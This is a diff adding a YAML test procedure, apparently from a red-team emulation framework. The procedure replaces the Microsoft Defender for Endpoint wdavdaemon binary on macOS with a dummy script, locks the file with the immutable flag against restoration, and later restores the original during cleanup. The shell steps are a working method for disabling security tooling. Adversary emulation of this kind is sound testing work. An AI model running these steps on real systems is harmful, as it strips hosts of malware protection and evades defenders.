@@ -1,0 +1,40 @@
+---
+api_version: 2.0
+uuid: 6d4ddbd9-f7d2-4337-9308-107e06927109
+name: replace_wdavdaemon
+authors:
+  - cedowens
+description: |
+  This TTP simply replaces the wdavdaemon binary to impair MDE.
+args:
+  - name: timeout
+    description: Time in seconds before starting the cleanup routine.
+    default: 30
+requirements:
+  platforms:
+    - os: darwin
+  superuser: true
+mitre:
+  tactics:
+    - TA0005 Defense Evasion
+  techniques:
+    - T1562 Impair Defenses
+  subtechniques:
+    - T1562.001 Disable or Modify Tools
+steps:
+  - name: replace_binary
+    inline: |
+      echo "First making a copy of the original wdavdaemon binary..."
+      sudo cp /Applications/Microsoft\ Defender.app/Contents/macOS/wdavdaemon wdavdaemon-orig
+      echo "Replacing wdavdaemon with a script that simply writes to a file in /tmp each time invoked. Also setting the immutable bit on wdavdaemon to prevent configuration management from overwriting it..."
+      echo -e '#!/bin/bash\necho "wdavdaemon replacement script was executed" >> /tmp/wdavout.txt' > wdavdaemon
+      sudo cp wdavdaemon /Applications/Microsoft\ Defender.app/Contents/macOS/wdavdaemon && sudo chflags schg /Applications/Microsoft\ Defender.app/Contents/macOS/wdavdaemon
+      echo "wdavdaemon replaced. Now waiting {{ .Args.timeout }}s before restoring in cleanup..."
+      sleep {{ .Args.timeout }}
+    cleanup:
+      inline: |
+        echo "Restoring the original wdavdaemon binary..."
+        sudo chflags noschg /Applications/Microsoft\ Defender.app/Contents/macOS/wdavdaemon && sudo mv wdavdaemon-orig /Applications/Microsoft\ Defender.app/Contents/macOS/wdavdaemon
+        rm -f /tmp/wdavout.txt
+        rm -f wdavdaemon
+        echo "Cleanup Done!"
